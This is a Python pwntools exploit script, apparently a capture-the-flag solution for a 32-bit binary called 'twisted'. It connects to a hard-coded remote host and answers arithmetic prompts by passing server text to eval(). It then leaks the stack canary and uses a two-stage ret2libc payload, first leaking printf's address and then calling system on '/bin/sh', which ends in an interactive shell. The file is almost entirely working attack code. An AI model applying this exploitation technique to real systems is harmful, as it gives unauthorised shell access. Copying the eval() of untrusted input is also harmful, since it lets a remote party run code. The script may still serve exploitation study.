from pwn import *
import time
import sys

def twisted(DEBUG):
	t = 0.3
	offset_system = 0x3a940
	offset_sh = 0x15902b
	offset_printf = 0x49020
	if DEBUG=="1":
		t = 0.005
		r = process("./twisted_patched")
		raw_input("debug?")
	elif DEBUG=="2":
		r = process("./twisted_patched", env={"LD_PRELOAD":"./libc.so.6"})
		raw_input("debug?")
	elif DEBUG=="3":
		HOST = '34.218.199.37'
		PORT = 6000
		r = remote(HOST,PORT)
	
	for i in xrange(312):
		question = r.recvuntil("\n").split("=")[0]
		answer  = eval(question)
		print question, answer
		r.sendline(str(answer))
	
	fgets_buff = 0x08048979
	puts_plt = 0x080484E0
	printf_got = 0x804a00c
	bss = 0x804b000-0x100
	r.recvuntil("Bot Verification Complete!\n")
	canary = u32(r.recv(4))
	log.info('canary: %#x' % canary)
	r.recv(1)
	r.send("1")
	payload = "A"*0x10
	payload += p32(canary)
	payload += p32(bss) # ebp
	payload += p32(puts_plt)
	payload += p32(fgets_buff)
	payload += p32(printf_got)
	raw_input("?")
	r.sendline(payload)
	printf = u32(r.recv(4)) # patched local binary -> puts(canary)
	"""
	.text:08048961                 push    offset dword_804AA28 ; Keypatch modified this from:
	.text:08048961                                         ;   push offset aEnterYourMessa
	.text:08048966                 call    _puts
	"""
	baselibc = printf - offset_printf
	system = baselibc + offset_system
	sh = baselibc + offset_sh
	log.info('libc: %#x' % baselibc)
	log.info('system: %#x' % system)
	log.info('sh: %#x' % sh)
	log.info('printf: %#x' % printf)
	
	payload = "A"*0x10
	payload += p32(canary)
	payload += p32(bss) # ebp
	payload += p32(system)
	payload += p32(fgets_buff)
	payload += p32(sh)
	raw_input("?")
	r.sendline(payload)
	r.interactive() 
	
twisted(sys.argv[1])